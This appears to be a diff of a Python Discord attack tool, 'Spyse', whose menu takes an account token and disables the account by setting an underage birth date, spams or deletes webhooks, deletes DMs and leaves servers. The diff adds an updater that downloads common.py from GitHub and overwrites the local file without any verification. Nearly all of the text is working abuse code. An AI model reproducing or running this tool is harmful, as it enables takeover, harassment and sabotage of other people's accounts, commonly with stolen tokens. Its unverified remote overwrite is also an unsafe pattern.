@@ -1,4 +1,5 @@
 #version test 2 
+
 import requests
 import colorama
 from colorama import *
@@ -10,8 +11,28 @@ import os
 from os import system
 console = get_console()
 
+maj = 'V2'
 
 
+def version():
+    print(">>> let us chek if your using the good version of SPYSE")
+    r = requests.get("https://raw.githubusercontent.com/heygdrg/Spyse/main/version.txt")
+    print(">>> Proccesing")
+    mode = r.text
+    with open('version.txt') as file:
+        txt = file.read()
+    if mode == txt:
+        print('>>> No new version found continue ')
+        time.sleep(1)
+    else:
+        fin = input(">>> a new version of SPYSE is available do you want to update ? [y/n]")
+        if fin == "n":
+            pass
+        else:
+            d = requests.get('https://raw.githubusercontent.com/heygdrg/Spyse/main/common.py')
+            update = d.text
+            with open('common.py', "w", encoding="utf-8") as file:
+                file.write(update)
 
 def validate_webhook(webhook):
     stat = requests.get(webhook).json()
@@ -28,6 +49,7 @@ def validate_webhook(webhook):
         main()
 
 
+
 def validateToken(token):
     r = requests.get('https://discord.com/api/v9/users/@me', headers=getheaders(token))
     if r.status_code == 200:
@@ -37,12 +59,13 @@ def validateToken(token):
         console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
         main()
 
-
 def getheaders(token):
+
     headers =     {
         "Content-Type": "application/json",
         'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
     }
+
     if token:
         headers.update({"Authorization": token})
         return headers
@@ -87,8 +110,11 @@ def token_info():
 [green][[/green][purple]Email[/purple][green]][/green]           {email}
 [green][[/green][purple]Phone number[/purple][green]][/green]    {phone if phone else ""}
                     ''')
+
     console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
     main()
+
+
 
 def BioChanger():
     os.system(f'Title - Spyse - Bio changer')
@@ -105,6 +131,8 @@ def BioChanger():
     console.input("[green][[/green][purple]?[/purple][green]][/green] Enter anything to [purple]anything[/purple]. . . ")
     main()
 
+
+
 def StartSeizure():
     os.system(f'Title - Spyse - Seizure')
     token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
@@ -117,7 +145,6 @@ def StartSeizure():
 
 
 
-
 def tokendisable():
     os.system(f'Title - Spyse - token nuker')
     token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
@@ -126,7 +153,7 @@ def tokendisable():
 
     if res.status_code == 400:
         res_message = res.json().get('date_of_birth', ['no response message'])[0]
-        
+
         if res_message == "You need to be 13 or older in order to use Discord.":
             console.print(f'[green][[/green][purple]![/purple][green]][/green] \n{Fore.RED}Token successfully disabled!{Fore.RESET}\n')
         elif res_message == "You cannot update your date of birth.":
@@ -157,6 +184,8 @@ def Leaver():
     console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
     main()
 
+
+
 def Webhook_Spammer():
     os.system(f'Title - Spyse - Webhook spamer')
     webhook = console.input('[green][[/green][purple]?[/purple][green]][/green] enter [purple]webhook[/purple] : ')
@@ -172,7 +201,11 @@ def Webhook_Spammer():
     main()
 
 
+
+
+
 def webhook_deleter():
+
     os.system(f'Title - Spyse - Webhook deleter')
     webhook = console.input(f'[green][[/green][purple]?[/purple][green]][/green]Enter [purple]webhook URL[/purple]: ')
     validate_webhook(webhook)
@@ -184,26 +217,31 @@ def webhook_deleter():
     main()
 
 
+
+
+
 def DmDeleter():
+
     os.system('Title - Spyse - Dm deleter')
     token = console.input("[green][[/green][purple]?[/purple][green]]Enter [purple]token[/purple] : ")
     validateToken(token)
     channel = console.input("[green][[/green][purple]?[/purple][green]]Enter [purple]channel id to delete[/purple] : ")
     requests.delete(f'https://discord.com/api/v9/channels/{channel}?silent=false', headers=getheaders(token))
     print(f"[green][[/green][purple]![/purple][green]]Deleted DM: [purple]{channel}[/purple]")
-
     console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
-
     main()
 
+
+
 def main():
-    
-    version = "V1"
-    os.system(f'Title - Spyse - {version}')
+
+    os.system(f'Title - Spyse - {maj}')
     os.system('cls||clear')
+
     banner = """
+
             
-            
+
                                     [green]███████[/green][purple]╗[green]██████[/green][purple]╗ [green]██[/green][purple]╗   [green]██[/green][purple]╗[green]███████[/green][purple]╗[green]███████[/green][purple]╗    
                                     [green]██[/green][purple]╔════╝[green]██[/green][purple]╔══[green]██[/green][purple]╗╚[green]██[/green][purple]╗ [green]██[/green][purple]╔╝[green]██[/green][purple]╔════╝[green]██[/green][purple]╔════╝    
                                     [green]███████[/green][purple]╗[green]██████[/green][purple]╔╝ ╚[green]████[/green][purple]╔╝ [green]███████[/green][purple]╗[green]█████[/green][purple]╗      
@@ -217,10 +255,12 @@ def main():
                             ║  [green]{[/green][purple]4[/purple][green]}[/green] Bio changer             [green]{[/green][purple]9[/purple][green]}[/green] Setting          ║
                             ║  [green]{[/green][purple]5[/purple][green]}[/green] Token nuker                                  ║                                                                                                                                                 
                             ╚═══════════════════════════════════════════════════╝
-                            
+                 
+
     """
+
     console.print(banner)
-    
+
     choice = console.input("[green][[/green][purple]?[/purple][green]][/green][purple] Your choice :[/purple] ")
     if choice == "1":
         DmDeleter()
@@ -243,5 +283,8 @@ def main():
     else:
         os.system('cls||clear')
         main()
+
 main()
+
+
 
